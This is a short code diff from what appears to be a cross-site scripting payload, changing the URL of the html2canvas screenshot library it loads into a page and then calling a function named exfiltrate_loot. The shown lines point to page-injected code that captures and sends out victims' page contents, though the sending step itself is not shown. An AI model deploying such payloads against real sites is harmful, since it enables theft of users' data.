@@ -65,6 +65,6 @@ function exfiltrate_loot() {
           exfiltrate_loot();
         });
     };
-    script.src = "//cdn.jsdelivr.net/npm/html2canvas@1.0.0-rc.7/dist/html2canvas.min.js";
+    script.src = "https://cdn.jsdelivr.net/npm/html2canvas@1.0.0-rc.7/dist/html2canvas.min.js";
     d.getElementsByTagName('head')[0].appendChild(script);
 }(document));
